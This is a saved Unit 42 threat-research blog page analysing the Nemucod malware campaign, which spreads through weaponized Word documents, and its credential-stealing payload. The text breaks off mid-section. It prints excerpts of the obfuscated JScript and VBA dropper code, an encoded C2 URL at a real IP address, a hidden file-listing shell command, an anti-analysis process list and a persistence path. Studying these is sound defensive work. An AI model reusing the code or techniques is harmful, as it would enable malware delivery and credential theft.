
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Practice Makes Perfect: Nemucod Evolves Delivery and Obfuscation Techniques to Harvest Credentials</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Practice Makes Perfect: Nemucod Evolves Delivery and Obfuscation Techniques to Harvest Credentials" />
<meta property="og:description" content="Unit 42 research team have been investigating a wave of Nemucod downloader malware that uses weaponized documents to deploy encoded, and heavily obfuscated JavaScript, ultimately leading to further payloads being delivered to the victim." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="AutoFocus" />
<meta property="article:tag" content="credential theft" />
<meta property="article:tag" content="Encoded JavaScript" />
<meta property="article:tag" content="Grizzly Steppe" />
<meta property="article:tag" content="JSE" />
<meta property="article:tag" content="Macro" />
<meta property="article:tag" content="Nemucod" />
<meta property="article:tag" content="scripting" />
<meta property="article:tag" content="Unit 42" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2017-05-11T11:00:48+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42 research team have been investigating a wave of Nemucod downloader malware that uses weaponized documents to deploy encoded, and heavily obfuscated JavaScript, ultimately leading to further payloads being delivered to the victim." />
<meta name="twitter:title" content="Practice Makes Perfect: Nemucod Evolves Delivery and Obfuscation Techniques to Harvest Credentials" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Practice Makes Perfect: Nemucod Evolves Delivery and Obfuscation Techniques to Harvest Credentials Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials/feed/" />
<meta property="og:likes" content="0"/>
<meta property="og:readtime" content="25"/>
<meta property="og:views" content="21,168"/>
<meta property="og:date_created" content="May 11, 2017 at 4:00 AM"/>
<meta property="og:post_length" content="8422"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Alex Hinchliffe"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/alex-hinchliffe/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Practice Makes Perfect: Nemucod Evolves Delivery and Obfuscation Techniques to Harvest Credentials","name":"Practice Makes Perfect: Nemucod Evolves Delivery and Obfuscation Techniques to Harvest Credentials","description":"Unit 42 research team have been investigating a wave of Nemucod downloader malware that uses weaponized documents to deploy encoded, and heavily obfuscated JavaScript, ultimately leading to further payloads being delivered to the victim. ","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-practice-makes-perfect-nemucod-evolves-delivery-obfuscation-techniques-harvest-credentials\/","datePublished":"May 11, 2017","articleBody":"Recently the Unit 42 research team have been investigating a wave of Nemucod downloader malware that uses weaponized documents to deploy encoded, and heavily obfuscated JavaScript, ultimately leading to further payloads being delivered to the victim. From a single instance of the encoded JavaScript discovered in one version of this malware, we pivoted on the Command and Control (C2) IPv4 address discovered during static analysis and deobfuscation, using our Threat Intelligence Service AutoFocus, unearthed many more versions of the malware and found that the versions seen to date were delivering a credential-stealing Trojan as the final payload.\n\nIn our recently published Unit 42 white paper Credential-Based Attacks we describe the importance of credentials to attackers, how they are stolen using techniques including malspam phishing as per this Nemucod campaign that delivers a credential stealing Trojan, as well as how the stolen credentials are used by the attackers to masquerade as legitimate users.\n\nOver the past five months we have tracked this campaign of Nemucod malware in various industry sectors across multiple countries with Europe amassing the highest number of attacks, followed by the United States of America and then Japan (as can be seen in Figure 1).\n\n\n\nFigure 1: Nemucod Destination Countries by session volume.\n\n\n\nFigure 2: Target Industries by session volume.\n\nSpain was the single most affected country, as shown in Figure 1, with the Professional and Legal Services sector, as shown in Figure 2, contributing the most towards that and also towards Belgium\u2019s total volume as well. Utilities was next, almost exclusively in France; Healthcare was primarily made up again from volume seen in Spain; Energy, towards the end of the list of Top 10 industries shown in Figure 3, was mostly due to activity in the United Kingdom; the Securities and Investments sector was mostly made up from traffic in the United States of America, United Kingdom and Norway. Malicious traffic seen in Japan was due to attacks seen in High Tech industries.\n\n\n\nFigure 3: European Countries by session volume.\n\nMuch of the malware arrived by email (using SMTP, POP3 and IMAP applications) as shown in Figure 4, the vast majority of which originated from Poland or at least using source email addresses with Polish domain names. Recipient email addresses varied but many seem valid based on names and linked-in account details. A small proportion of the sessions seen were over the web-browsing application being downloaded from websites resolving to IP addresses in Moldova, which will be discussed in more detail later.\n\n\n\nFigure 4: Nemucod network application by session volume\n\nThe remainder of this blog describes the evolution of the malware since that time, as well as other topics:\n\n \tWeaponized document evolution.\n \tInsight into the possible workflow and setup of the attackers, including their infrastructure.\n \tObfuscation and social engineering techniques used.\n \tThe credential theft payload.\n\nTechnical Analysis\nDropper Evolution\n\nApart from a brief period of time in January 2017, when the actors delivered the encoded JScript content via Delphi-compiled dropper executable files, we have primarily observed only weaponized documents using Microsoft Office Macros using Visual Basic for Applications (VBA) code to install Nemucod. It\u2019s hard to know why the attackers changed briefly from using weaponized documents to using executable files and then switched back again, especially considering the volume of documents carrying malware nowadays. Perhaps they were testing their own or their targets\u2019 capabilities.\n\nIn total Unit 42 has seen over 50 versions of these weaponized documents spanning from late October through to March. We\u2019ve used these to lay out a timeline, which will be referenced throughout the remainder of this blog, of the milestones of evolution that provides some insight into why the changes are made. Note: This figure does not cover all versions seen but simply milestone changes. It does however start with the first version created on October 23rd, last saved 25th October and first seen by our Wildfire cloud sandbox 26th October.\n\n\n\nFigure 5: Timeline showing evolution of Nemucod weaponized documents.\n\nCommon throughout all versions of the weaponized document droppers is password-protected VBA code, as shown in Figure 6 below. The attackers use this to hinder researcher analysis and perhaps to give the document more legitimacy for those people, or security solutions, looking at such properties.\n\n\n\nFigure 6: Password-protected VBA editor to protect code\n\nAlso common to all versions is the use of a heavily obfuscated JScript payload, an excerpt of which is shown in Figure 7. The obfuscation makes use of variable names that are seemingly randomly generated, extensive use of Unicode character encoding (e.g. \\u00xx) where xx is the ASCII character code representation, and the use of generally unnecessary arithmetic to piece together sub-strings or select characters from strings. Such obfuscation is primarily to avoid signature-based detection technologies but has little to no effect on dynamic analysis sandbox systems, such as Wildfire. It does however cause some headaches and delays during manual analysis.\n esesop_famous4='symbol';esesop_However7='breaking';esesop_pillar7='Paolo';esesop_pretends='Leading';esesop_comfortable='quattrocento1';esesop_PABLO='artistic10';esesop_Raphael7='Durer5';esesop_Picasso='demonstrates';esesop_clearly5='between';esesop_TURNER5='being3';esesop_famous8='renewal';esesop_often1='expressionism';esesop_Abstract7='MARCEL8';esesop_above='loose7';esesop_many1='years';esesop_courtesan='modernism10';esesop_with='FRIDA';esesop_JACKSON='romanticism';esesop_Sistine='Quattrocento';var esesop_considered=this[[''+String[{p0:'\\u0066'}.p0+{p0:'\\u0072'}.p0+{p1:'\\u006f'}.p1+{p_t1:'\\u006d'}.p_t1+{p_s0:'\\u0043'}.p_s0+{p_1:'\\u0068'}.p_1+{p_l0:'\\u0061'}.p_l0+{p0:'\\u0072'}.p0+{p3:'\\u0043'}.p3+{p_1:'\\u006f'}.p_1+{p_f2:'\\u0064'}.p_f2+{p_h2:'\\u0065'}.p_h2](Math[{p_3:'\\u006d'}.p_3+{p_M2:'\\u0061'}.p_M2+{p3:'\\u0078'}.p3](87,[]))+'',\nFigure 7: Obfuscated JScript code\n\nIn one of the earlier versions, towards the end of October and as shown by the fourth item in the Figure 5 timeline, an extra ASCII cipher obfuscation layer (excerpt in Figure 8) was added together with accompanying VBA code (Figure 9) to de-obfuscate said layer. This cipher obfuscation indicates the actors yearn to avoid detection.\n 6D6D@A072&gt;@FDclVDJ&gt;3@=Vj6D6D@A0w@H6G6CflV3C62&lt;:?8Vj6D6D@A0A:==2CflV!2@=@Vj6D6D@A0AC6E6?5DlV{625:?8Vj6D6D@A04@&gt;7@CE23=6lVBF2EEC@46?E@`Vj6D6D@A0!pq{~lV2CE:DE:4`_Vj6D6D@A0#2A926=flVsFC6CdVj6D6D@A0!:42DD@lV56&gt;@?DEC2E6DVj6D6D@A04=62C=JdlV36EH66?Vj6D6D@A0%\"\nFigure 8: Extra layer of obfuscated JScript code\n Function Ghost(str)\n    Dim i, j, k, r\n    j = Len(str)\n    r = \"\"\n    For i = 1 To j\n        k = Asc(Mid(str, i, 1))\n        If k &gt;= 33 And k &lt;= 126 Then\n            r = r &amp; Chr(33 + ((k + 14) Mod 94))\n        Else\n            r = r &amp; Chr(k)\n        End If\n    Next\n    Ghost = r\nEnd Function\nFigure 9: VBA de-obfuscation code for extra layer of JScript obfuscation\n\nIt took a while for the actors to update any obfuscation techniques for the JScript code but around the middle of December, versions started to make use of Microsoft Script Encoding replacing their custom ASCII cipher perhaps for simplicity or bugs they themselves were finding difficult to debug.\n\nSuch encoded content often resides in files with a .JSE extension but it\u2019s prudent to confirm by checking the magic bytes \u201c#@~^\u201d are present at the start of the file, an example of which is shown below:\n $ hexdump -C wx64.jse | head\n00000000  23 40 7e 5e 4c 58 51 42  41 41 3d 3d 64 5e 57 4f  |#@~^LXQBAA==d^WO|\n00000010  7f 5c 7f 44 43 6d 5c 7f  2b 2a 7b 20 31 26 70 2f  |.\\.DCm\\.+*{ 1&amp;p\/|\nFigure 10: Use of Microsoft\u2019s Script Encoding to further obfuscate the JScript code\n\nDon\u2019t judge a document by its cover\n\nIt\u2019s often interesting to extract document meta-data and other information from such weaponized documents in case it provides insight into the investigation. Of course, much of this data could be forged (as other researchers have shown) or simply nonsensical. In this case, there\u2019s plenty of interesting variable data and information that make some conclusions quite plausible.\n\nLooking at the charts below it\u2019s clear to see patterns emerging in how the threat actors\u2019 development of malware used in the campaign has evolved and how it\u2019s analogous to a software development team working on a new project, tweaking code over time with some versions being major releases and others being minor.\n\nPlotting the number of revisions made to each of the weaponized documents, as shown in Figure 11, and overlaying the number of words in each document\u2019s body, highlights some patterns beginning to emerge.\n\n\n\nFigure 11: Chart plotting number of revisions (right-axis) to each document and the number of words contained (left-axis).\n\nThe properties of the weaponized document of the initial version from late October indicates a large number of revisions \u2013 the highest with 192 \u2013 compared to all other versions since, which makes sense if it is indeed the actor\u2019s first version indicating the authoring effort was significant with many modifications made. Again, this is analogous to a software developer\u2019s first version of a piece of software.\n\nMost of the versions avoided using anything but default VBA project property details, such as Project Names and Project Descriptions, however initially I didn\u2019t think this would be the case having analysed the first version. Figure 12 below shows the custom Project Description used in this version.\n\n\n\nFigure 12: VBA project description used in the first version.\n\nIf you don\u2019t recognise this quote, Figure 13 below should provide some more context.\n\n\n\nFigure 13: Breaking Bad season one, episode seven.\n\nThe quote used as the project description in the first version was a word for word copy from a scene in episode seven, season one of the American crime drama television series Breaking Bad. Warning \u2013 spoiler alert. I find it very fitting the threat actors should include this reference in their malware because, just as with the plot of the television series where a character was not always a criminal but turned to such a lifestyle to support his family, the person or persons behind this malware campaign must have switched at some point from law abiding to being cyber criminals.\n\nOther document versions, much like the first with its 192 revisions as previously mentioned, also have an above-average number of revisions that tie to significant updates and feature releases in the malware\u2019s evolution akin to a major software release. I will discuss these in more detail shortly but before moving on it\u2019s worth highlighting the significance of the flat-line (zero) for the number of words included in these document versions that suddenly jumps up to over 6,000 words on the 30th November 2016 and that continues to trend upwards eventually ending with some of the most recent versions having over three times the number of words. Over this time period, as the number of words in each document increased, during this time the obfuscation techniques remained fairly stagnant indicating that the amount of code was increasing as more capabilities were added over time.\n\nIn addition to the number of words and edit revisions of these weaponized documents, comparing the time spent editing them compounds the aforementioned patterns in the evolution. Figure 14 shows a couple of interesting points to note. Firstly, that the initial version took the most amount of editing thus far \u2013 over 2 days \u2013 and secondly, that the next highest amount of time spent was on the November 30th coinciding with the aforementioned spike in number of words from zero to over 6,000.\n\n\n\nFigure 14: Chart plotting amount of editing time for each version.\n\nNovember 30th was certainly a significant shift in the techniques used by the actors and, investigating further, the change made by the actors between the two dates was to move the encoded JScript code from being statically held within the VBA code to being stored in the Word document itself.\n\nHow much VBA is too much?\n\nPre-November 30th all versions seen had the obfuscated (but not yet encoded at this point) JScript code stored in the malicious VBA code within Word\u2019s AutoOpen macro, such that the code will execute automatically when the document is opened by the victim. The excerpt in Figure 15 provides a glimpse of said code but is truncated by many 100s of lines. Highlighted in bold is the code to add chunks of the obfuscated JScript code into an array object that will later be enumerated, processed and reassembled for writing to disk as a single .JSE file for execution by the Microsoft Windows Script Host executable (wscript.exe). The VBA code is overcomplicated with various function and object names being broken up unnecessarily and stitched together at run-time to be syntactically correct, another effort to hinder human analysis.\n Sub AutoOpen()\n\n'==========================================================================\nDim objSysInfo: Set objSysInfo = CreateObject(\"WinNTSystemInfo\")\nDim objFSO:     Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\nDim objShell:   Set objShell = CreateObject(\"Shell.Application\")\nDim objDic:     Set objDic = CreateObject(\"Scripting.Dictionary\")\nDim objPO:      Set objPO = CreateObject(\"Scripting.Dictionary\")\nDim wsh:        Set wsh = VBA.CreateObject(\"WScript.Shell\")\n'==========================================================================\n\nDim filepath As String:  filepath = Empty\nDim tempcode12 As String:  tempcode12 = Empty\nDim hash12 As String:  hash12 = Empty\nDim strComputerName As String:  strComputerName = Empty\nDim objFile, empty12, filets, ver, out1, proc\nDim hash#, upper&amp;, i&amp;\nDim now, mimi As Long\nConst max# = 2 ^ 31\n\n\nWith objDic\n.Add \"g1\", \"angul_tryingI=0.669;angul_something=0.105;angul_never6=0.879;angul_shes=913;angul_aware8=0.663;angul_said=846;angul_cold=739;angul_life7=0.927;angul_dare3=370;angul_sees=0.96;angul_whole8=0.31;angul_yourself=707;angul_goneShe=0.21;var angul_stayEven1\"\n.Add \"g2\", \"={_lo3:'\\u0045'}._lo3+{_m1:'\\u006e'}._m1+{_d2:'\\u0074'}._d2+{_1:'\\u0065'}._1+{_th3:'\\u0072'}._th3+{_ah1:'\\u0020'}._ah1+{_re1:'\\u0074'}._re1+{_d0:'\\u0068'}._d0+{_0:'\\u0065'}._0+{_K3:'\\u0020'}._K3+{_wi1:'\\u0074'}._wi1+{_n1:'\\u0065'}._n1+{_w1:'\\u0078'}.\"\n.Add \"g3\", \"_w1+{_re0:'\\u0074'}._re0+{_sh3:'\\u0020'}._sh3+{_0:'\\u0074'}._0+{_t3:'\\u006f'}._t3+{_y2:'\\u0020'}._y2+{_1:'\\u0065'}._1+{_pr0:'\\u006e'}._pr0+{_w1:'\\u0063'}._w1+{_j2:'\\u006f'}._j2+{_h0:'\\u0064'}._h0+{_fa1:'\\u0065'}._fa1+{_3:'\\u0020'}._3+{_j0:'\\u0074'}._\"\n\u2026\n\nFigure 15: Obfuscated JScript code stored in VBA code\n\nSince the von November 30th the VBA code has been replaced by less than 10 lines of code, as in Figure 16, that simply reads the text contents of the word document and writes it to the .JSE file. Over time the obfuscation of this smaller VBA code changed slightly to make string and signature-based detection difficult by over-complicated code syntax and by strings, such as filenames, being split and joined at run-time.\n\n\n\nFigure 16: VBA code to retrieve obfuscated JScript code stored in document body\n\nAs can be seen in the code in Figure 16, the .JSE file will be written to disk in the same folder where the document resides and with the same filename as the document but having the .JSE extension. For a file named foobar.doc located on the desktop a file foobar.doc.jse will appear on the desktop.\n\nThe VBA code ActiveDocument.Content.Text is responsible for retrieving the obfuscated JScript content from the Word document, which in the case of one version highlighted in Figure 17, is 24 pages long but as you can see in the same figure, the document looks blank. Selecting-all in the 24 pages reveals more and changing the font colour to something other than white reveals the malicious code, as shown in Figure 18.\n\n\n\nFigure 17: Post November 30th version showing 24 pages of blank content.\n\n\n\nFigure 18: Revealing the hidden malicious code.\n\nThere could be numerous reasons for this change of moving the JSE code from within VBA to the document text, one of which could be simplicity for the actors, as per their shift from using their custom cipher code for obfuscation to Microsoft\u2019s Script Encoder, which gave them less code to maintain. Another could be to throw off antivirus scanners and tools that use heuristics to evaluate the suspiciousness of files for which a 24-page document with content and a small amount of VBA code might look less suspicious than a 1-page, no-content document with 100s of lines of VBA code.\n\nIt could also be a social engineering technique as victims may be inclined to click on the \u201cEnable Content\u201d button if they believe the document has content but cannot see it. Of course, clicking this button would instead result in the VBA code being executed.\n\nPractice makes perfect\n\nContinuing along the Figure 5 timeline into December, around the middle of the month a version appeared that made use of the Security Permissions in Office applications to prevent unauthorised changes, such as marking areas of the document read-only, which also prohibits changing the font colour of the document text. However, such document permissions don\u2019t stretch to Data Loss Prevention (DLP) capabilities so it\u2019s possible to select the document text content and copy &amp; paste into another application to retrieve the malicious code. Figure 19 shows the difference in document properties between versions pre (left) and post (right) permission changes that occurred on the December 18th version. Only a couple of the 20+ versions after December 18th were missing these permissions with no obvious evidence (e.g. new author, major code release, day of the week etc) to explain why but given the consistency with the others using permission it\u2019s possible a human error occurred or the actor\u2019s release process failed to check whether permissions were set.\n\n\n\nFigure 19: Word document permissions missing (left) in earlier versions and present in most later versions (right)\n\nIn the week between Christmas and New Year \u2013 you know, that time where you\u2019ve eaten too much, perhaps drunk too much and work, and the world in general, tends to be in go-slow mode \u2013 you would be an attacker\u2019s perfect recipient of some unwanted phishing emails to take advantage of your stupor. On Wednesday December 28th a new version was created that boosted the social engineering capabilities of this malware.\n\nFigure 20 shows the addition of a fake message claiming that the document was edited in a later version of Word and to view it, the recipient should click \u201cEnable Content\u201d. The festive period aside, it\u2019s likely the actors were trying to stimulate the growth of their victim base with such tactics.\n\n\n\nFigure 20: Social engineering used to entice victims to run their malicious macro code.\n\nSince the beginning of 2017 we have seen a few versions including VBA GUI Form elements, as shown in the Figure 21. Currently the form, elements and skeleton code behind the scenes do nothing so one can only presume this is yet another measure to create a sense of legitimacy and perhaps throw some antivirus solutions off the scent by making the macro code seem quite benign. The use of GUIs is quite uncommon in malware as actors often don\u2019t want to interact with victims and raise suspicion, unless to ask for ransom payments but there\u2019s no indication of such payloads being used with these downloaders yet, nor any sense of these forms looking anything like typical ransomware ransom messages.\n\n\n\nFigure 21: VBA Forms including GUI elements in some recent versions.\n\nAbout one week after the first version to include VBA Form GUI elements another version emerged this time showing, albeit it in a faded grey colour, the encoded JScript code within the document text, as shown in Figure 22. Perhaps this is another lure technique to have victims click \u201cEnable Content\u201d believing the text may be \u2018enabled\u2019 and turn to the default black colour or look less like garbled text.\n\n\n\nFigure 22: Grey, faded font properties used\n\nApproaching the end of the current Figure 5 attack timeline now, some new versions seen around mid-January included a VBA code change to use Word\u2019s AutoClose macro function instead of AutoOpen as used in all previous versions. The technical effect of this change should be quite obvious but the effect from a social engineering perspective and one of delaying or avoiding raising suspicion to the victim might be less obvious.\n\nQuite often when weaponized documents like these are opened or enabled (\u201cEnable Content\u201d has been clicked) the effect is immediate \u2013 CPU spikes, ransom messages appear, network connections are made and so on. It may not be obvious that something untoward is happening but often hard drive noises, CPU fans or other indicators tell you otherwise. In this case however, the user could open the document safely, even click the \u201cEnable Content\u201d button and still remain safe and if no tell-tale signs of infection occur one might think all is well. Closing the document, or the Word application itself, however would trigger the infection routine by which point you may have felt a sense of relief nothing had happened. Short lived.\n\nSome other points listed in the Figure 5 timeline worth discussing include the Operating System version, Code page and the Authors. Throughout the evolution of all the weaponized document versions all but two, according to their meta-data, were created using Word on a Windows 5.1 (XP) operating system; Windows 6.1 (Windows 7) was used for the two outliers. Incidentally, the two versions created on Windows 7 introduced two new Authors as well.\n\nAuthor \u201cTill3\u201d appeared approximately one month after the first version and created their version on the 25th November, made 3 revisions to the content and last saved the document some 13 minutes after creating it. This version was one of the last of the \u201coriginal\u201d types where the JSE code was stored statically in the VBA code.\n\nAuthor \u201cNish\u201d appeared several versions later, around 14th December, making hardly any revisions and spending almost no time editing the document but doing so also on a Windows 7 host.\n\nAs for the rest of the authors, and their Windows XP systems, Figure 23 shows that most of the versions \u2013 over half \u2013 were created by authors with no names while Victor created almost a quarter and the rest were split in similar small numbers between John, Mike, Martin and two previously mentioned, Till3 and Nish.\n\nInterestingly, it seems Victor played a much larger role in the final saves, and possibly edits, of over three quarters of all versions perhaps indicating him as a more senior member of the group or a team leader of sorts.\n\n\n\nFigure 23: Author names (left), last saved names (right).\n\nAll versions of the weaponized documents gathered thus far share the same Code Page, 1251, which is designed to cover languages that use Cyrillic script, such as Russian, Bulgarian, Serbian Cyrillic and some other similar languages.\n\nAs shown in Figure 24 below, December was the busiest month for the actors who released close to 30 versions \u2013 almost one a day. It\u2019s hard to know why the change in rates over the different months other than to say that clearly lots of churn was happening to various aspects of their malware and delivery mechanisms, which may have led to slightly higher numbers earlier on. As previously mentioned, and as described in our recent blog providing a glimpse into how the OilRig actors develop and test their malware in an attempt to remain undetected and to carry out multiple attacks without having to completely retool, these threat actors have shown during this Nemucod campaign their quite rapid development process that added features, ensured minimal detection rates by using obfuscation and other methods, and their enhancements in social engineering techniques to lure new victims.\n\n\n\nFigure 24: Number of versions per month\n\nThe JSE Payload\n\nAssuming the weaponized document\u2019s macro code has executed the encoded, heavily obfuscated JScript code will be saved to disk and executed. One of the first behaviours observed is that of a fake error message box, such as the example in Figure 25. Message text varies but follows a theme of reporting something seemingly legitimate failed to run \u2013 another false sense of security for the victim.\n\n\n\nFigure 25: Fake error message opened as part of the JSE execution\n\nThe vast majority of versions copy the JSE file to the Windows Startup Folder, as shown below, to ensure the code runs with every system reboot.\nC:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Start \nMenu\\Programs\\Startup\\\n\nThe JSE code uses various obfuscation routines and techniques to hinder analysis, including the use of Unicode characters in place of the ASCII character equivalent when declaring some variable names and for some strings. Converting these characters back to ASCII as part of the de-obfuscation process reveals some content that provides useful entry points for further analysis, an example of which includes the variable name \u201c\\u0075\\u0072\\u006c\\u0031\\u0032\u201d, which translates in ASCII to \u201curl12\u201d.\n\nIn one version this variable is initialized with the following code, which decodes at run-time to the following URL string \u2018https:\/\/185.159.82[.]11:3333\/P\/tipster.php?\u2019.\n {orl_8:'\\u0068'}.orl_8+{hich_5:([][[]] + []).fixed().toLowerCase().substr(1,1)}.hich_5+{ud_6:([][[]] + []).fixed().toLowerCase().substr(1,1)}.ud_6+{ar_6:'\\u0070'}.ar_6+{he_9:'\\u0073'}.he_9+{ta_7:'\\u003a'}.ta_7+{vr_4:'\\u002f'}.vr_4+{hich_9:'\\u002f'}.hich_9+{ith_5:'\\u0031'}.ith_5+{hy_8:'\\u0038'}.hy_8+{ur_7:'\\u0035'}.ur_7+{etLi_8:([][[]] + []+{ine4_9:([][[]] + []+{on_5:([][[]] + []+'.').split([])[9]}.on_5).split([])[9]}.ine4_9).split([])[9]}.etLi_8+{ort_8:'\\u0031'}.ort_8+{hat_5:'\\u0035'}.hat_5+{orms_4:'\\u0039'}.orms_4+{ut_5:([][[]] + []+{ine4_9:([][[]] + []+{on_5:([][[]] + []+'.').split([])[9]}.on_5).split([])[9]}.ine4_9).split([])[9]}.ut_5+{heeT_8:'\\u0038'}.heeT_8+{es_5:'\\u0032'}.es_5+{pea_4:([][[]] + []+{ine4_9:([][[]] + []+{on_5:([][[]] + []+'.').split([])[9]}.on_5).split([])[9]}.ine4_9).split([])[9]}.pea_4+{or_8:'\\u0031'}.or_8+{ist_8:'\\u0031'}.ist_8+{ut_9:'\\u003a'}.ut_9+{pec_8:'\\u0033'}.pec_8+{ive_6:'\\u0033'}.ive_6+{emo_8:'\\u0033'}.emo_8+{xpe_9:'\\u0033'}.xpe_9+{ill_7:'\\u002f'}.ill_7+{ich_9:'\\u0050'}.ich_9+{owrf_8:'\\u002f'}.owrf_8+{ave8_5:([][[]] + []).fixed().toLowerCase().substr(1,1)}.ave8_5+{ain_6:(!'8' || []+[] || 'i')}.ain_6+{ec_7:'\\u0070'}.ec_7+{ason_4:'\\u0073'}.ason_4+{ost_8:([][[]] + []).fixed().toLowerCase().substr(1,1)}.ost_8+{in_5:(!'x' || []+[] || 'e')}.in_5+{our7_6:([][[]] + []).link().toLowerCase().substr(4,1)}.our7_6+{hi_6:([][[]] + []+{ine4_9:([][[]] + []+{on_5:([][[]] + []+'.').split([])[9]}.on_5).split([])[9]}.ine4_9).split([])[9]}.hi_6+{art_5:'\\u0070'}.art_5+{onou_4:'\\u0068'}.onou_4+{eeps_4:'\\u0070'}.eeps_4+{ark_7:'\\u003f'}.ark_7+{mpri_9:'\\u0061'}.mpri_9+{he_9:(!'s' || []+[] || 'd')}.he_9+{et_8:(!'s' || []+[] || 'd')}.et_8+{ath9_4:'\\u003d'}.ath9_4;[\nAdditional parameters, as shown in the example below, are later concatenated to this URL to form the HTTP GET request that would be used when connecting to the actor\u2019s infrastructure to register new victims via unique user ids (uid below) as well as provide additional information about the client, including which version of the malware that infected the victim\u2019s system allowing the actors to know how many victims are running particular versions of the malware. Using a version identifier in communication code is another behaviour of this malware analogous to a software developer wanting feedback or telemetry about their application being run in the wild.\n\n \tadd=3ef295d92702b904d009ba73e42a69c2\n \tuid=1442894259\n \tout=0\n \tver=20\n\nThe JSE code continues by enumerating all running processing and checks for matches against the following list of applications and quits if they are found. Clearly the malware does not want to be analysed. The \u201cJohnson-PC\u201d item below perhaps relates to well-known sandboxes that may use such names for their analysis machines, which the malware is keen to avoid running in.\n\nProcmon\nWireshark\nTemp\\iexplore.exe\nProcessHacker\nvmtools\nVBoxService\npython\nImmunityDebugger\nJohnson-PC\nProxifier.exe\n\nThe malware then runs a hidden command shell issuing commands, as shown below, to get a list of files and their full paths where said file extensions match the list described below. The list is redirected to a text file named, in at least one of the versions, as \u2018pollos.txt\u2019 \u2013 another reference to Breaking Bad.\ncmd \/U \/Q \/C cd \/D DriveLetter: &amp;&amp; dir \/b\/s\/x &lt;file_extension_list&gt; &gt;&gt; %temp%\\\\pollos.txt\n\n&lt;file_extension_list&gt;:\n\n*.doc *.xls *.pub *.odt *.ods *.odp *.odm *.odc *.odb *.wps \n*.xlk *.ppt *.mdb *.accdb *.pst *.dwg *.dxf *.dxg *.wpd \n*.rtf *.wb2 *.mdf *.dbf *.psd *.pdd *.eps *.ai *.indd *.cdr \n*.dng *.3fr *.arw *.srf *.sr2 *.bay *.crw *.cr2 *.dcr *.kdc \n*.erf *.mef *.mrw *.nef *.nrw *.orf *.raf *.raw *.rwl *.rw2 \n*.r3d *.ptx *.pef *.srw *.x3f *.der *.txt *.pdf\n\nDuring communication with the remote host IP mentioned above, the JSE may download another Portable Executable (PE), the payload of which could differ. In this version\u2019s case, and on this occasion, a Base64-encoded, UPX-packed PE file (SHA256:76b703c9430abf4e0ba09e6d4e4d6cf94a251bb0e7f3fadbd169fcef954a8b39) was downloaded and responsible for injecting another PE component (SHA256:53edea186162d84803f8ff72fb83c85f427b3813c32bd9d9d899e74ae283368e) into memory to carry out the credential harvesting and exfiltration duties discussed next. It\u2019s possible the actors could switch this malware out to another depending on their objectives and motivations. The Polish CERT team posted a blog earlier this year describing related malware that ultimately resulted in ransomware however during our research we have not seen such behaviour.\n\nCredential Harvesting\n\nAnalysing one of the payload files installed by Nemucod in more detail shows the extent of credential stealing capabilities. The payload enumerates various Operating System and application credential stores in order to harvest as many credentials as possible.\n\nProtected Storage (Pstore)\n\nAfter determining the running Operation System is a legacy version, such as Windows XP, the malware starts by attempting to load the pstorec.dll library, to access the legacy Windows data store, Pstore. If successful a call to the PStoreCreateInstance function to get the pointer to protected storage will be made to allow calls to 